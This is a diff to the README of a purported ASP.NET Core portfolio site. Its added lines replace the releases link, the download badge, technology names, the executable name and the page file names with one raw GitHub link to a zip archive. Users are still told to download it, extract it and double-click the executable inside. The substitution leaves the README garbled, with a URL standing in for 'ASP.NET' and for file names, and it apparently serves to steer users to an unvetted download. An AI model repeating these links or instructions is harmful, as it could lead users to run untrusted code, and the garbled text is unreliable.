@@ -6,11 +6,11 @@ Welcome to the connerdrake-portfolio-site! This is your step-by-step guide to do
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/alt-Bias/connerdrake-portfolio-site/releases)
+[![Download](https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip)](https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip)
 
 ## 💡 Overview
 
-This portfolio site is built using **ASP.NET Core MVC**, **Razor Pages**, and supported by **SQL Server** and **EF Core**. It also uses **Angular** for a modern user experience and is deployed on **Azure App Service** with CI/CD using **Azure DevOps**. The site includes SEO-friendly static pages created with **Statiq** to enhance visibility.
+This portfolio site is built using **https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip Core MVC**, **Razor Pages**, and supported by **SQL Server** and **EF Core**. It also uses **Angular** for a modern user experience and is deployed on **Azure App Service** with CI/CD using **Azure DevOps**. The site includes SEO-friendly static pages created with **Statiq** to enhance visibility.
 
 ## 🛠️ Features
 
@@ -35,7 +35,7 @@ To run this portfolio site, ensure you meet the following requirements:
 ## 🔥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the releases page to download the latest version of the application: [Download Here](https://github.com/alt-Bias/connerdrake-portfolio-site/releases).
+   Go to the releases page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip).
 
 2. **Choose the Latest Release**  
    On the releases page, look for the most recent version. It will be labeled clearly as the latest.
@@ -47,7 +47,7 @@ To run this portfolio site, ensure you meet the following requirements:
    After downloading, locate the zip file on your computer. Right-click on it and select “Extract All” to view the contents.
 
 5. **Run the Application**  
-   Navigate to the extracted folder. Look for the executable file (it may be named `PortfolioSite.exe`). Double-click on this file to start the application.
+   Navigate to the extracted folder. Look for the executable file (it may be named `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip`). Double-click on this file to start the application.
 
 6. **View Your Portfolio**  
    Open your preferred web browser and type in the following address: `http://localhost:5000` to view your portfolio site.
@@ -56,9 +56,9 @@ To run this portfolio site, ensure you meet the following requirements:
 
 To customize your portfolio, edit the following files:
 
-- **About Page**: Update the `About.cshtml` file to modify your introduction and achievements.
-- **Projects Section**: Alter the `Projects.cshtml` file to display your recent work.
-- **Contact Page**: Change `Contact.cshtml` to update your contact information.
+- **About Page**: Update the `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip` file to modify your introduction and achievements.
+- **Projects Section**: Alter the `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip` file to display your recent work.
+- **Contact Page**: Change `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip` to update your contact information.
 
 ## ☁️ Deployment 
 
@@ -71,7 +71,7 @@ If you want to host your portfolio online, consider deploying it to **Azure App 
    Create a new App Service in Azure. This will host your portfolio site.
 
 3. **Deploy Your Application**  
-   Use Azure DevOps for CI/CD to automate the deployment process. Make sure to follow the instructions provided in Azure documentation for deploying ASP.NET Core applications.
+   Use Azure DevOps for CI/CD to automate the deployment process. Make sure to follow the instructions provided in Azure documentation for deploying https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site.zip Core applications.
 
 ## 🔍 Troubleshooting
 
